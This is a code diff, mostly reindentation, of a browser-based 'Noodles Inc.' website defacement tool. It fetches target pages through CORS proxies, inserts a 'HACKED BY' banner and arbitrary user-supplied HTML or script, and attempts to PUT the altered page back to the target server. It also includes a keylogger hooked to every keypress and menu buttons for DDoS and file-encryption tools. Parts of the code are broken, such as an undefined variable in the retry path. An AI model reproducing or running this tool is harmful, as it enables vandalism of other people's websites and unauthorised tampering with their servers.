@@ -12,11 +12,11 @@
 
 // Logger function
 function logAction(message) {
-  const logElement = document.getElementById("log");
-  if (logElement) {
-    logElement.innerHTML += `<span style="color: darkblue;">[${new Date().toISOString()}]</span>: <span style="color: darkgreen;">${message}</span><br>`;
-  }
-  console.log(message); // Keep console logging for debugging
+    const logElement = document.getElementById("log");
+    if (logElement) {
+        logElement.innerHTML += `<span style="color: darkblue;">[${new Date().toISOString()}]</span>: <span style="color: darkgreen;">${message}</span><br>`;
+    }
+    console.log(message); // Keep console logging for debugging
 }
 
 // Apply dark theme
@@ -25,27 +25,27 @@ document.body.style.color = "white";
 
 // Disclaimer popup
 window.onload = function () {
-  if (!confirm("THIS IS YOUR LAST CHANCE TO TURN BACK. THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY. ANY MISUSE IS YOUR SOLE RESPONSIBILITY. DO YOU UNDERSTAND? (Noodles Inc. IS NOT LIABLE, EVER)")) {
-    window.close();
-  } else {
-    logAction("User acknowledged the disclaimer and chose to proceed.");
-  }
+    if (!confirm("THIS IS YOUR LAST CHANCE TO TURN BACK. THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY. ANY MISUSE IS YOUR SOLE RESPONSIBILITY. DO YOU UNDERSTAND? (Noodles Inc. IS NOT LIABLE, EVER)")) {
+        window.close();
+    } else {
+        logAction("User acknowledged the disclaimer and chose to proceed.");
+    }
 };
 
 // Load proxies from JSON file
 async function loadProxies() {
-  try {
-    const response = await fetch('/public/main/proxies.json');
-    if (!response.ok) {
-      throw new Error(`HTTP error! Status: ${response.status}`);
+    try {
+        const response = await fetch('/public/main/proxies.json');
+        if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
+        }
+        const data = await response.json();
+        return data.proxies; // Assuming your JSON has a "proxies" key
+    } catch (error) {
+        console.error("Error loading proxies:", error);
+        logAction(`Error loading proxies: ${error}`);
+        return [];
     }
-    const data = await response.json();
-    return data.proxies; // Assuming your JSON has a "proxies" key
-  } catch (error) {
-    console.error("Error loading proxies:", error);
-    logAction(`Error loading proxies: ${error}`);
-    return [];
-  }
 }
 
 // CORS Anywhere Proxy (Self-Hosted if possible)
@@ -53,196 +53,196 @@ let proxies = []; // Array to hold proxies
 
 // Function to fetch content with CORS bypass and error handling
 async function fetchWithCORS(url, attempts = 0) {
-  if (proxies.length === 0) {
-    proxies = await loadProxies(); // Load proxies if not already loaded
-  }
-
-  if (proxies.length === 0) {
-    alert("No proxies available. Check console, asshole.");
-    logAction("No proxies available.");
-    throw new Error("No proxies available");
-  }
-
-  const proxy = proxies[attempts % proxies.length]; // Cycle through proxies
-
-  const proxiedUrl = proxy + encodeURIComponent(url);
-
-  try {
-    const response = await fetch(proxiedUrl, {
-      method: 'GET',
-      mode: 'cors', // Explicitly set CORS mode
-      headers: {
-        'Origin': window.location.origin, // Include origin header
-        'X-Requested-With': 'XMLHttpRequest' // Add X-Requested-With header
-      }
-    });
-    if (!response.ok) {
-      if (response.status === 403 || response.status === 429) {
-        // If proxy is forbidden or rate limited, try another one
-        if (attempts < proxies.length) {
-          logAction(`Proxy ${proxy} failed, trying another...`);
-          return fetchWithCORS(url, attempts + 1); // Recursive call with next proxy
-        } else {
-          throw new Error(`All proxies failed for URL: ${url}`);
-        }
-      }
-      throw new Error(`HTTP error! Status: ${response.status}`);
+    if (proxies.length === 0) {
+        proxies = await loadProxies(); // Load proxies if not already loaded
     }
-    return await response.text();
-  } catch (error) {
-    console.error("Error fetching with CORS bypass:", error);
-    alert("Failed to fetch URL. Check console for details, asshole.");
-    logAction(`Fetch error: ${error}`);
-    throw error; // Re-throw to handle it in the main function
-  }
+
+    if (proxies.length === 0) {
+        alert("No proxies available. Check console, asshole.");
+        logAction("No proxies available.");
+        throw new Error("No proxies available");
+    }
+
+    const proxy = proxies[attempts % proxies.length]; // Cycle through proxies
+
+    const proxiedUrl = proxy + encodeURIComponent(url);
+
+    try {
+        const response = await fetch(proxiedUrl, {
+            method: 'GET',
+            mode: 'cors', // Explicitly set CORS mode
+            headers: {
+                'Origin': window.location.origin, // Include origin header
+                'X-Requested-With': 'XMLHttpRequest' // Add X-Requested-With header
+            }
+        });
+        if (!response.ok) {
+            if (response.status === 403 || response.status === 429) {
+                // If proxy is forbidden or rate limited, try another one
+                if (attempts < proxies.length) {
+                    logAction(`Proxy ${proxy} failed, trying another...`);
+                    return fetchWithCORS(url, attempts + 1); // Recursive call with next proxy
+                } else {
+                    throw new Error(`All proxies failed for URL: ${url}`);
+                }
+            }
+            throw new Error(`HTTP error! Status: ${response.status}`);
+        }
+        return await response.text();
+    } catch (error) {
+        console.error("Error fetching with CORS bypass:", error);
+        alert("Failed to fetch URL. Check console for details, asshole.");
+        logAction(`Fetch error: ${error}`);
+        throw error; // Re-throw to handle it in the main function
+    }
 }
 
 // Function to perform defacement
 async function performDefacement(targetURL, defacementCode) {
-  try {
-    // Input validation
-    if (!isValidURL(targetURL)) {
-      alert("Invalid URL, dipshit!");
-      logAction("Invalid URL entered: " + targetURL);
-      return;
-    }
-
-    if (defacementCode.length > 10000) {
-      alert("Defacement code too long, dumbass! Keep it under 10000 characters.");
-      logAction("Defacement code too long.");
-      return;
-    }
-
-    // Backup functionality (REAL - Grab that shit before you wreck it)
-    logAction("Backing up website content...");
-    await backupWebsite(targetURL);
-    logAction("Backup completed.");
-
-    // Preview functionality (See what you're about to unleash)
-    logAction("Previewing defacement...");
-    const previewFrame = document.getElementById("previewFrame");
-    if (previewFrame) {
-      previewFrame.srcdoc = defacementCode;
-    } else {
-      console.error("Preview frame not found!");
-      alert("Preview frame not found. Check console, DIPSHIT.");
-      logAction("Preview frame not found.");
-    }
-
-    // Defacement action (REAL - Let the fun begin!)
-    logAction("Defacing website...");
-
-    const originalContent = await fetchWithCORS(targetURL);
-    const modifiedContent = originalContent.replace('</body>', `<div style="color: purple; background-color: darkred; font-size: 2em; text-align: center;">HACKED BY Noodles Inc. - YOU JUST GOT FUCKED!</div>${defacementCode}</body>`);
-
-    // Attempt to PUT the modified content. If that fails, attempt to inject via script tag.
     try {
-      // Use a proxy to bypass CORS for PUT requests
-      const proxiedUrl = proxies.length > 0 ? proxies[0] + encodeURIComponent(targetURL) : targetURL;
+        // Input validation
+        if (!isValidURL(targetURL)) {
+            alert("Invalid URL, dipshit!");
+            logAction("Invalid URL entered: " + targetURL);
+            return;
+        }
 
-      const response = await fetch(proxiedUrl, {
-        method: 'PUT',
-        mode: 'cors', // Explicitly set CORS mode
-        headers: {
-          'Content-Type': 'text/html',
-          'Origin': window.location.origin, // Include origin header
-          'X-Requested-With': 'XMLHttpRequest' // Add X-Requested-With header
-        },
-        body: modifiedContent,
-      });
+        if (defacementCode.length > 10000) {
+            alert("Defacement code too long, dumbass! Keep it under 10000 characters.");
+            logAction("Defacement code too long.");
+            return;
+        }
 
-      if (!response.ok) {
-        throw new Error(`HTTP error during PUT! Status: ${response.status}`);
-      }
+        // Backup functionality (REAL - Grab that shit before you wreck it)
+        logAction("Backing up website content...");
+        await backupWebsite(targetURL);
+        logAction("Backup completed.");
 
-      logAction('Defacement successful using PUT!');
-    } catch (putError) {
-      console.warn("PUT request failed, attempting script injection:", putError);
-      logAction("PUT request failed, attempting script injection");
-      // Inject the defacement code using a script tag. Less reliable, but bypasses some protections.
-      injectDefacement(targetURL, defacementCode);
+        // Preview functionality (See what you're about to unleash)
+        logAction("Previewing defacement...");
+        const previewFrame = document.getElementById("previewFrame");
+        if (previewFrame) {
+            previewFrame.srcdoc = defacementCode;
+        } else {
+            console.error("Preview frame not found!");
+            alert("Preview frame not found. Check console, DIPSHIT.");
+            logAction("Preview frame not found.");
+        }
+
+        // Defacement action (REAL - Let the fun begin!)
+        logAction("Defacing website...");
+
+        const originalContent = await fetchWithCORS(targetURL);
+        const modifiedContent = originalContent.replace('</body>', `<div style="color: purple; background-color: darkred; font-size: 2em; text-align: center;">HACKED BY Noodles Inc. - YOU JUST GOT FUCKED!</div>${defacementCode}</body>`);
+
+        // Attempt to PUT the modified content. If that fails, attempt to inject via script tag.
+        try {
+            // Use a proxy to bypass CORS for PUT requests
+            const proxiedUrl = proxies.length > 0 ? proxies[0] + encodeURIComponent(targetURL) : targetURL;
+
+            const response = await fetch(proxiedUrl, {
+                method: 'PUT',
+                mode: 'cors', // Explicitly set CORS mode
+                headers: {
+                    'Content-Type': 'text/html',
+                    'Origin': window.location.origin, // Include origin header
+                    'X-Requested-With': 'XMLHttpRequest' // Add X-Requested-With header
+                },
+                body: modifiedContent,
+            });
+
+            if (!response.ok) {
+                throw new Error(`HTTP error during PUT! Status: ${response.status}`);
+            }
+
+            logAction('Defacement successful using PUT!');
+        } catch (putError) {
+            console.warn("PUT request failed, attempting script injection:", putError);
+            logAction("PUT request failed, attempting script injection");
+            // Inject the defacement code using a script tag. Less reliable, but bypasses some protections.
+            injectDefacement(targetURL, defacementCode);
+        }
+
+    } catch (error) {
+        console.error("Error:", error);
+        alert("Something went wrong. Check the console, DIPSHIT.");
+        logAction(`Critical error: ${error}`);
     }
-
-  } catch (error) {
-    console.error("Error:", error);
-    alert("Something went wrong. Check the console, DIPSHIT.");
-    logAction(`Critical error: ${error}`);
-  }
 }
 
 // Function to inject defacement code using a script tag
 async function injectDefacement(targetURL, defacementCode, attempts = 0) {
-  if (proxies.length === 0) {
-    proxies = await loadProxies(); // Load proxies if not already loaded
-  }
+    if (proxies.length === 0) {
+        proxies = await loadProxies(); // Load proxies if not already loaded
+    }
 
-  if (proxies.length === 0) {
-    alert("No proxies available. Check console, asshole.");
-    logAction("No proxies available.");
-    throw new Error("No proxies available");
-  }
+    if (proxies.length === 0) {
+        alert("No proxies available. Check console, asshole.");
+        logAction("No proxies available.");
+        throw new Error("No proxies available");
+    }
 
-  const proxy = proxies[attempts % proxies.length]; // Cycle through proxies
-  try {
-    const proxiedUrl = proxy + encodeURIComponent(targetURL);
-    const response = await fetch(proxiedUrl, {
-      method: 'GET',
-      mode: 'cors',
-      headers: {
-        'Origin': window.location.origin,
-        'X-Requested-With': 'XMLHttpRequest'
-      }
-    });
+    const proxy = proxies[attempts % proxies.length]; // Cycle through proxies
+    try {
+        const proxiedUrl = proxy + encodeURIComponent(targetURL);
+        const response = await fetch(proxiedUrl, {
+            method: 'GET',
+            mode: 'cors',
+            headers: {
+                'Origin': window.location.origin,
+                'X-Requested-With': 'XMLHttpRequest'
+            }
+        });
 
-    if (!response.ok) {
-       if (response.status === 403 || response.status === 429) {
-        // If proxy is forbidden or rate limited, try another one
-        if (attempts < proxies.length) {
-          logAction(`Proxy ${proxy} failed, trying another...`);
-          return injectDefacement(url, defacementCode, attempts + 1); // Recursive call with next proxy
-        } else {
-          throw new Error(`All proxies failed for URL: ${url}`);
+        if (!response.ok) {
+            if (response.status === 403 || response.status === 429) {
+                // If proxy is forbidden or rate limited, try another one
+                if (attempts < proxies.length) {
+                    logAction(`Proxy ${proxy} failed, trying another...`);
+                    return injectDefacement(url, defacementCode, attempts + 1); // Recursive call with next proxy
+                } else {
+                    throw new Error(`All proxies failed for URL: ${url}`);
+                }
+            }
+            throw new Error(`HTTP error! Status: ${response.status}`);
         }
-      }
-      throw new Error(`HTTP error! Status: ${response.status}`);
+
+        let originalContent = await response.text();
+
+        // Create a script element with the defacement code
+        const scriptTag = `<script>${defacementCode}</script>`;
+
+        // Inject the script tag into the body of the original content
+        const modifiedContent = originalContent.replace('</body>', `${scriptTag}</body>`);
+
+        // Attempt to PUT the modified content back to the server
+        const putResponse = await fetch(proxiedUrl, {
+            method: 'PUT',
+            mode: 'cors',
+            headers: {
+                'Content-Type': 'text/html',
+                'Origin': window.location.origin,
+                'X-Requested-With': 'XMLHttpRequest'
+            },
+            body: modifiedContent
+        });
+
+        if (!putResponse.ok) {
+            throw new Error(`HTTP error during PUT! Status: ${putResponse.status}`);
+        }
+
+        logAction('Defacement successful using script injection!');
+    } catch (error) {
+        console.error("Error injecting script:", error);
+        alert("Failed to inject script. Check console for details, asshole.");
+        logAction(`Script injection error: ${error}`);
     }
-
-    let originalContent = await response.text();
-
-    // Create a script element with the defacement code
-    const scriptTag = `<script>${defacementCode}</script>`;
-
-    // Inject the script tag into the body of the original content
-    const modifiedContent = originalContent.replace('</body>', `${scriptTag}</body>`);
-
-    // Attempt to PUT the modified content back to the server
-    const putResponse = await fetch(proxiedUrl, {
-      method: 'PUT',
-      mode: 'cors',
-      headers: {
-        'Content-Type': 'text/html',
-        'Origin': window.location.origin,
-        'X-Requested-With': 'XMLHttpRequest'
-      },
-      body: modifiedContent
-    });
-
-    if (!putResponse.ok) {
-      throw new Error(`HTTP error during PUT! Status: ${putResponse.status}`);
-    }
-
-    logAction('Defacement successful using script injection!');
-  } catch (error) {
-    console.error("Error injecting script:", error);
-    alert("Failed to inject script. Check console for details, asshole.");
-    logAction(`Script injection error: ${error}`);
-  }
 }
 
 // Add form for target URL and defacement code
 function addDefacementForm() {
-  const formDiv = document.createElement('div');
-  formDiv.innerHTML = `
+    const formDiv = document.createElement('div');
+    formDiv.innerHTML = `
   <h2>Defacement Tool</h2>
   <label for="targetURL">Target URL:</label><br>
   <input type="text" id="targetURL" name="targetURL" style="width:100%;"><br><br>
@@ -250,24 +250,24 @@ function addDefacementForm() {
   <textarea id="defacementCode" name="defacementCode" rows="10" cols="50" style="width:100%;"></textarea><br><br>
   <button id="defaceButton">Deface Website</button>
   `;
-  document.body.appendChild(formDiv);
+    document.body.appendChild(formDiv);
 
-  // Event listener for deface button click
-  document.getElementById("defaceButton").addEventListener("click", async function () {
-    const targetURL = document.getElementById("targetURL").value;
-    const defacementCode = document.getElementById("defacementCode").value;
+    // Event listener for deface button click
+    document.getElementById("defaceButton").addEventListener("click", async function () {
+        const targetURL = document.getElementById("targetURL").value;
+        const defacementCode = document.getElementById("defacementCode").value;
 
-    if (!targetURL || !defacementCode) {
-      alert("ENTER A TARGET AND SOME FUCKING CODE, YA MORON.");
-      logAction("User failed to enter target URL or defacement code.");
-      return;
-    }
+        if (!targetURL || !defacementCode) {
+            alert("ENTER A TARGET AND SOME FUCKING CODE, YA MORON.");
+            logAction("User failed to enter target URL or defacement code.");
+            return;
+        }
 
-    logAction(`Target URL: ${targetURL}`);
-    logAction(`Defacement Code: ${defacementCode}`);
+        logAction(`Target URL: ${targetURL}`);
+        logAction(`Defacement Code: ${defacementCode}`);
 
-    await performDefacement(targetURL, defacementCode);
-  });
+        await performDefacement(targetURL, defacementCode);
+    });
 }
 
 addDefacementForm();
@@ -294,124 +294,124 @@ document.body.appendChild(infoElement);
 // Function to add backup functionality
 async function backupWebsite(targetURL, attempts = 0) {
     if (proxies.length === 0) {
-    proxies = await loadProxies(); // Load proxies if not already loaded
-  }
+        proxies = await loadProxies(); // Load proxies if not already loaded
+    }
 
-  if (proxies.length === 0) {
-    alert("No proxies available. Check console, asshole.");
-    logAction("No proxies available.");
-    throw new Error("No proxies available");
-  }
+    if (proxies.length === 0) {
+        alert("No proxies available. Check console, asshole.");
+        logAction("No proxies available.");
+        throw new Error("No proxies available");
+    }
 
-  const proxy = proxies[attempts % proxies.length]; // Cycle through proxies
+    const proxy = proxies[attempts % proxies.length]; // Cycle through proxies
 
-  try {
-    logAction("Backing up website content...");
-    const backupContent = await fetchWithCORS(targetURL);
-    const backupBlob = new Blob([backupContent], { type: "text/html" });
-    const backupLink = document.createElement("a");
-    backupLink.href = URL.createObjectURL(backupBlob);
-    backupLink.download = "website_backup.html";
-    backupLink.click();
-    logAction("Backup completed.");
-  } catch (error) {
-    console.error("Error during backup:", error);
-    alert("Backup failed, you fucking idiot.");
-    logAction(`Error during backup: ${error}`);
-  }
+    try {
+        logAction("Backing up website content...");
+        const backupContent = await fetchWithCORS(targetURL);
+        const backupBlob = new Blob([backupContent], { type: "text/html" });
+        const backupLink = document.createElement("a");
+        backupLink.href = URL.createObjectURL(backupBlob);
+        backupLink.download = "website_backup.html";
+        backupLink.click();
+        logAction("Backup completed.");
+    } catch (error) {
+        console.error("Error during backup:", error);
+        alert("Backup failed, you fucking idiot.");
+        logAction(`Error during backup: ${error}`);
+    }
 }
 
 // Function to add restore functionality
 async function restoreWebsite(targetURL, attempts = 0) {
-  const backupURL = "website_backup.html";
+    const backupURL = "website_backup.html";
     if (proxies.length === 0) {
-    proxies = await loadProxies(); // Load proxies if not already loaded
-  }
-
-  if (proxies.length === 0) {
-    alert("No proxies available. Check console, asshole.");
-    logAction("No proxies available.");
-    throw new Error("No proxies available");
-  }
-
-  const proxy = proxies[attempts % proxies.length]; // Cycle through proxies
-
-  try {
-    logAction("Attempting to restore website...");
-    const backupResponse = await fetch(backupURL, { mode: 'cors' });
-    const backupContent = await backupResponse.text();
-
-    // Use a proxy to bypass CORS for PUT requests
-    const proxiedUrl = proxies.length > 0 ? proxies[0] + encodeURIComponent(targetURL) : targetURL;
-
-    const response = await fetch(proxiedUrl, {
-      method: 'PUT',
-      mode: 'cors', // Explicitly set CORS mode
-      headers: {
-        'Content-Type': 'text/html',
-        'Origin': window.location.origin, // Include origin header
-        'X-Requested-With': 'XMLHttpRequest' // Add X-Requested-With header
-      },
-      body: backupContent,
-    });
-
-    if (!response.ok) {
-      throw new Error(`HTTP error! Status: ${response.status}`);
+        proxies = await loadProxies(); // Load proxies if not already loaded
     }
 
-    logAction("Website restoration completed for: " + targetURL);
-  } catch (error) {
-    console.error("Error during restoration:", error);
-    alert("Restoration failed, you fucking idiot.");
-    logAction(`Error during restoration: ${error}`);
-  }
+    if (proxies.length === 0) {
+        alert("No proxies available. Check console, asshole.");
+        logAction("No proxies available.");
+        throw new Error("No proxies available");
+    }
+
+    const proxy = proxies[attempts % proxies.length]; // Cycle through proxies
+
+    try {
+        logAction("Attempting to restore website...");
+        const backupResponse = await fetch(backupURL, { mode: 'cors' });
+        const backupContent = await backupResponse.text();
+
+        // Use a proxy to bypass CORS for PUT requests
+        const proxiedUrl = proxies.length > 0 ? proxies[0] + encodeURIComponent(targetURL) : targetURL;
+
+        const response = await fetch(proxiedUrl, {
+            method: 'PUT',
+            mode: 'cors', // Explicitly set CORS mode
+            headers: {
+                'Content-Type': 'text/html',
+                'Origin': window.location.origin, // Include origin header
+                'X-Requested-With': 'XMLHttpRequest' // Add X-Requested-With header
+            },
+            body: backupContent,
+        });
+
+        if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
+        }
+
+        logAction("Website restoration completed for: " + targetURL);
+    } catch (error) {
+        console.error("Error during restoration:", error);
+        alert("Restoration failed, you fucking idiot.");
+        logAction(`Error during restoration: ${error}`);
+    }
 }
 
 // Add preview functionality
 function addPreview() {
-  const previewDiv = document.createElement('div');
-  previewDiv.innerHTML = `
+    const previewDiv = document.createElement('div');
+    previewDiv.innerHTML = `
     <h2>Preview</h2>
     <iframe id="previewFrame" style="width:100%;height:300px;background-color:white;"></iframe>
   `;
-  document.body.appendChild(previewDiv);
+    document.body.appendChild(previewDiv);
 }
 
 addPreview();
 
 // Validate URL
 function isValidURL(str) {
-  try {
-    new URL(str);
-    return true;
-  } catch (_) {
-    return false;
-  }
+    try {
+        new URL(str);
+        return true;
+    } catch (_) {
+        return false;
+    }
 }
 
 // Security Headers (Gotta protect ourselves, right?)
 function setSecurityHeaders() {
-  // Prevent Cross-Site Scripting (XSS) attacks
-  document.head.appendChild(createMetaTag('http-equiv', 'Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;"));
+    // Prevent Cross-Site Scripting (XSS) attacks
+    document.head.appendChild(createMetaTag('http-equiv', 'Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;"));
 
-  // Prevent Clickjacking attacks
-  document.head.appendChild(createMetaTag('http-equiv', 'X-Frame-Options', 'DENY'));
+    // Prevent Clickjacking attacks
+    document.head.appendChild(createMetaTag('http-equiv', 'X-Frame-Options', 'DENY'));
 
-  // Enable Cross-Site Scripting (XSS) filter
-  document.head.appendChild(createMetaTag('http-equiv', 'X-XSS-Protection', '1; mode=block'));
+    // Enable Cross-Site Scripting (XSS) filter
+    document.head.appendChild(createMetaTag('http-equiv', 'X-XSS-Protection', '1; mode=block'));
 
-  // Prevent MIME-sniffing vulnerabilities
-  document.head.appendChild(createMetaTag('http-equiv', 'X-Content-Type-Options', 'nosniff'));
+    // Prevent MIME-sniffing vulnerabilities
+    document.head.appendChild(createMetaTag('http-equiv', 'X-Content-Type-Options', 'nosniff'));
 
-  function createMetaTag(httpEquiv, content, deny) {
-    const meta = document.createElement('meta');
-    meta.setAttribute('http-equiv', httpEquiv);
-    meta.setAttribute('content', content);
-    if (deny) {
-      meta.setAttribute('X-Frame-Options', deny); // Set X-Frame-Options attribute if provided
+    function createMetaTag(httpEquiv, content, deny) {
+        const meta = document.createElement('meta');
+        meta.setAttribute('http-equiv', httpEquiv);
+        meta.setAttribute('content', content);
+        if (deny) {
+            meta.setAttribute('X-Frame-Options', deny); // Set X-Frame-Options attribute if provided
+        }
+        return meta;
     }
-    return meta;
-  }
 }
 
 setSecurityHeaders();
@@ -432,11 +432,11 @@ document.body.appendChild(scanlines);
 
 // Reporting Feature (For documenting findings and vulnerabilities)
 function reportIssue() {
-  const report = prompt("Describe the issue you found, dipshit:");
-  if (report) {
-    logAction("Issue reported: " + report);
-    alert("Thanks for the report, dumbass. We'll totally ignore it.");
-  }
+    const report = prompt("Describe the issue you found, dipshit:");
+    if (report) {
+        logAction("Issue reported: " + report);
+        alert("Thanks for the report, dumbass. We'll totally ignore it.");
+    }
 }
 
 const reportButton = document.createElement('button');
@@ -470,8 +470,8 @@ particleContainer.style.cssText = `
 document.body.appendChild(particleContainer);
 
 function createParticle() {
-  const particle = document.createElement('div');
-  particle.style.cssText = `
+    const particle = document.createElement('div');
+    particle.style.cssText = `
     position: absolute;
     width: 5px;
     height: 5px;
@@ -482,24 +482,24 @@ function createParticle() {
     opacity: ${Math.random()};
     animation: float ${Math.random() * 5 + 5}s linear infinite;
   `;
-  particleContainer.appendChild(particle);
+    particleContainer.appendChild(particle);
 
-  particle.addEventListener('animationiteration', () => {
-    particle.style.top = `${Math.random() * 100}%;`;
-    particle.style.left = `${Math.random() * 100}%;`;
-    particle.style.opacity = `${Math.random()}`;
-  });
+    particle.addEventListener('animationiteration', () => {
+        particle.style.top = `${Math.random() * 100}%;`;
+        particle.style.left = `${Math.random() * 100}%;`;
+        particle.style.opacity = `${Math.random()}`;
+    });
 }
 
 for (let i = 0; i < 50; i++) {
-  createParticle();
+    createParticle();
 }
 
 // Keylogger
 function keylogger() {
-  document.addEventListener('keydown', function (event) {
-    logAction(`Key pressed: ${event.key}`);
-  });
+    document.addEventListener('keydown', function (event) {
+        logAction(`Key pressed: ${event.key}`);
+    });
 }
 
 // Run keylogger
@@ -507,8 +507,8 @@ keylogger();
 
 // Add Navbar
 function addNavbar() {
-  const navbar = document.createElement('nav');
-  navbar.style.cssText = `
+    const navbar = document.createElement('nav');
+    navbar.style.cssText = `
     position: fixed;
     top: 0;
     left: 0;
@@ -521,62 +521,62 @@ function addNavbar() {
     align-items: center;
   `;
 
-  const logo = document.createElement('span');
-  logo.textContent = 'Noodles Inc.';
-  logo.style.cssText = `
+    const logo = document.createElement('span');
+    logo.textContent = 'Noodles Inc.';
+    logo.style.cssText = `
     color: white;
     font-size: 1.5em;
     font-weight: bold;
     cursor: pointer;
   `;
-  navbar.appendChild(logo);
+    navbar.appendChild(logo);
 
-  const defaceButtonNav = document.createElement('button');
-  defaceButtonNav.textContent = 'Defacement Tool';
-  defaceButtonNav.style.cssText = `
+    const defaceButtonNav = document.createElement('button');
+    defaceButtonNav.textContent = 'Defacement Tool';
+    defaceButtonNav.style.cssText = `
     padding: 10px;
     background-color: darkred;
     color: white;
     border: none;
     cursor: pointer;
   `;
-  defaceButtonNav.addEventListener('click', () => {
-    // Redirect or show defacement tool section
-    redirectToDeface();
-  });
-  navbar.appendChild(defaceButtonNav);
+    defaceButtonNav.addEventListener('click', () => {
+        // Redirect or show defacement tool section
+        redirectToDeface();
+    });
+    navbar.appendChild(defaceButtonNav);
 
-  const ddosButtonNav = document.createElement('button');
-  ddosButtonNav.textContent = 'DDoS Tool';
-  ddosButtonNav.style.cssText = `
+    const ddosButtonNav = document.createElement('button');
+    ddosButtonNav.textContent = 'DDoS Tool';
+    ddosButtonNav.style.cssText = `
     padding: 10px;
     background-color: darkred;
     color: white;
     border: none;
     cursor: pointer;
   `;
-  ddosButtonNav.addEventListener('click', () => {
-    // Redirect or show DDoS tool section
-    redirectToDDOS();
-  });
-  navbar.appendChild(ddosButtonNav);
+    ddosButtonNav.addEventListener('click', () => {
+        // Redirect or show DDoS tool section
+        redirectToDDOS();
+    });
+    navbar.appendChild(ddosButtonNav);
 
-  const encryptButtonNav = document.createElement('button');
-  encryptButtonNav.textContent = 'File Encryption Tool';
-  encryptButtonNav.style.cssText = `
+    const encryptButtonNav = document.createElement('button');
+    encryptButtonNav.textContent = 'File Encryption Tool';
+    encryptButtonNav.style.cssText = `
     padding: 10px;
     background-color: darkred;
     color: white;
     border: none;
     cursor: pointer;
   `;
-  encryptButtonNav.addEventListener('click', () => {
-    // Redirect or show File Encryption tool section
-    redirectToEncryptionTool();
-  });
-  navbar.appendChild(encryptButtonNav);
+    encryptButtonNav.addEventListener('click', () => {
+        // Redirect or show File Encryption tool section
+        redirectToEncryptionTool();
+    });
+    navbar.appendChild(encryptButtonNav);
 
-  document.body.appendChild(navbar);
+    document.body.appendChild(navbar);
 }
 
 // Run addNavbar
@@ -584,8 +584,8 @@ addNavbar();
 
 // Add Sidebar
 function addSidebar() {
-  const sidebar = document.createElement('aside');
-  sidebar.style.cssText = `
+    const sidebar = document.createElement('aside');
+    sidebar.style.cssText = `
     position: fixed;
     top: 50%;
     left: 0;
@@ -599,19 +599,19 @@ function addSidebar() {
     align-items: center;
   `;
 
-  const sidebarTitle = document.createElement('span');
-  sidebarTitle.textContent = 'Tools';
-  sidebarTitle.style.cssText = `
+    const sidebarTitle = document.createElement('span');
+    sidebarTitle.textContent = 'Tools';
+    sidebarTitle.style.cssText = `
     color: white;
     font-size: 1.2em;
     font-weight: bold;
     margin-bottom: 15px;
   `;
-  sidebar.appendChild(sidebarTitle);
+    sidebar.appendChild(sidebarTitle);
 
-  const defaceButtonSidebar = document.createElement('button');
-  defaceButtonSidebar.textContent = 'Defacement';
-  defaceButtonSidebar.style.cssText = `
+    const defaceButtonSidebar = document.createElement('button');
+    defaceButtonSidebar.textContent = 'Defacement';
+    defaceButtonSidebar.style.cssText = `
     padding: 10px;
     background-color: darkred;
     color: white;
@@ -619,15 +619,15 @@ function addSidebar() {
     cursor: pointer;
     margin-bottom: 10px;
   `;
-  defaceButtonSidebar.addEventListener('click', () => {
-    // Redirect or show defacement tool section
-    redirectToDeface();
-  });
-  sidebar.appendChild(defaceButtonSidebar);
+    defaceButtonSidebar.addEventListener('click', () => {
+        // Redirect or show defacement tool section
+        redirectToDeface();
+    });
+    sidebar.appendChild(defaceButtonSidebar);
 
-  const ddosButtonSidebar = document.createElement('button');
-  ddosButtonSidebar.textContent = 'DDoS';
-  ddosButtonSidebar.style.cssText = `
+    const ddosButtonSidebar = document.createElement('button');
+    ddosButtonSidebar.textContent = 'DDoS';
+    ddosButtonSidebar.style.cssText = `
     padding: 10px;
     background-color: darkred;
     color: white;
@@ -635,28 +635,28 @@ function addSidebar() {
     cursor: pointer;
     margin-bottom: 10px;
   `;
-  ddosButtonSidebar.addEventListener('click', () => {
-    // Redirect or show DDoS tool section
-    redirectToDDOS();
-  });
-  sidebar.appendChild(ddosButtonSidebar);
+    ddosButtonSidebar.addEventListener('click', () => {
+        // Redirect or show DDoS tool section
+        redirectToDDOS();
+    });
+    sidebar.appendChild(ddosButtonSidebar);
 
-  const encryptButtonSidebar = document.createElement('button');
-  encryptButtonSidebar.textContent = 'Encryption';
-  encryptButtonSidebar.style.cssText = `
+    const encryptButtonSidebar = document.createElement('button');
+    encryptButtonSidebar.textContent = 'Encryption';
+    encryptButtonSidebar.style.cssText = `
     padding: 10px;
     background-color: darkred;
     color: white;
     border: none;
     cursor: pointer;
   `;
-  encryptButtonSidebar.addEventListener('click', () => {
-    // Redirect or show File Encryption tool section
-    redirectToEncryptionTool();
-  });
-  sidebar.appendChild(encryptButtonSidebar);
+    encryptButtonSidebar.addEventListener('click', () => {
+        // Redirect or show File Encryption tool section
+        redirectToEncryptionTool();
+    });
+    sidebar.appendChild(encryptButtonSidebar);
 
-  document.body.appendChild(sidebar);
+    document.body.appendChild(sidebar);
 }
 
 // Run addSidebar
@@ -701,24 +701,24 @@ document.body.appendChild(encryptionInfoElement);
 
 // Function to redirect to the encryption tool
 function redirectToEncryptionTool() {
-  window.location.href = '/encryption';
+    window.location.href = '/encryption';
 }
 
 // Function to redirect to the DDoS tool
 function redirectToDDOS() {
-  window.location.href = '/ddos';
+    window.location.href = '/ddos';
 }
 
 // Function to redirect to the Defacement Tool
 function redirectToDeface() {
-  window.location.href = "/defacement";
+    window.location.href = "/defacement";
 }
 
 // Auto Reload (refresh every 10 seconds)
 function autoReload() {
-  setTimeout(function () {
-    location.reload();
-  }, 10000);
+    setTimeout(function () {
+        location.reload();
+    }, 10000);
 }
 
 // Run autoReload
@@ -726,149 +726,149 @@ autoReload();
 
 // Function to add Navbar links
 function addNavbarLinks() {
-  const navbar = document.querySelector('nav');
+    const navbar = document.querySelector('nav');
 
-  const defaceLink = document.createElement('a');
-  defaceLink.textContent = 'Defacement Tool';
-  defaceLink.href = "/defacement";
-  defaceLink.style.cssText = `
+    const defaceLink = document.createElement('a');
+    defaceLink.textContent = 'Defacement Tool';
+    defaceLink.href = "/defacement";
